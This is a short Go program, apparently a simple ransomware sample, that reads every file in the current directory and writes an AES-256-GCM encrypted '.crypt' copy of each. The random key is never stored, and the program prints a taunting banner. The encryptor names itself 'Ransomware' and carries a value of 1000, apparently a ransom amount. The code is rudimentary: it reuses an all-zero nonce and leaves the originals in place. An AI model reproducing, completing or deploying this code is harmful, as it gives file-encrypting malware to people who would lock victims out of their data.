package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"fmt"
	"io/fs"
	"io/ioutil"
	"log"
)

type Encryptor struct {
	Files []fs.FileInfo
	Name  string
	Value float32
	key   *[]byte
	UID   string
	IP    string
}

func CreateEncryptor(files []fs.FileInfo, name string, value float32) Encryptor {
	bytes := make([]byte, 32) //generate a random 32 byte key for AES-256
	if _, err := rand.Read(bytes); err != nil {
		panic(err.Error())
	}

	return Encryptor{Files: files, Name: name, Value: value, key: &bytes}
}

func (e *Encryptor) EncryptFiles() error {
	block, err := aes.NewCipher(*e.key)
	if err != nil {
		log.Panic(fmt.Sprintf("Error creating block: %v", err))
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		log.Panic(fmt.Sprintf("Error creating GCM: %v", err))
	}

	for _, f := range e.Files {
		nonce := make([]byte, gcm.NonceSize())

		file, err := ioutil.ReadFile(f.Name())
		if err != nil {
			log.Fatal(err)
		}

		encrypted := gcm.Seal(nonce, nonce, file, nil)
		err = ioutil.WriteFile(fmt.Sprintf("%s.crypt", f.Name()), encrypted, 0777)
		if err != nil {
			log.Panic("Could not save encrypted file.")
		}
	}

	return nil
}

func main() {
	fmt.Println("!!!! WHY DID YOU RUN THIS FILE !!!!")
	files, err := ioutil.ReadDir("./")
	if err != nil {
		log.Fatalf("Error reading files from directory: %v", err)
	}

	encryptor := CreateEncryptor(files, "Ransomware", 1000.0)
	encryptor.EncryptFiles()
}
